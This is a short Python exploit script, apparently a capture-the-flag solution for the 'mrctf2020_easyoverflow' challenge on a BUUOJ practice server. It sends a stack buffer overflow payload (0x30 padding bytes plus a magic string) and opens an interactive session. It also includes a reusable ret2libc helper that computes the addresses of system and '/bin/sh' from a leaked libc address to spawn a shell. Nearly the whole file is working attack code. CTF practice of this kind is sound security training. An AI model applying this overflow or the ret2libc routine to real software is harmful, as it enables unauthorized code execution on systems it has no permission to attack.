from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv

def ret2libc(leak, func, path=''):
	if path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
	else:
		libc = ELF(path)
		base = leak - libc.sym[func]
		system = base + libc.sym['system']
		binsh = base + libc.search('/bin/sh').next()

	return (system, binsh)


context(os='linux', arch='amd64', log_level='debug')
binary = './mrctf2020_easyoverflow'

context.binary = binary
elf = ELF(binary)
io = remote('node4.buuoj.cn',28675) if argv[1]=='r' else process(binary)

payload = b'a'* (0x30) + b'n0t_r3@11y_f1@g'
#其实直接输入aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaan0t_r3@11y_f1@g即可拿到flag
io.send(payload)
io.interactive()
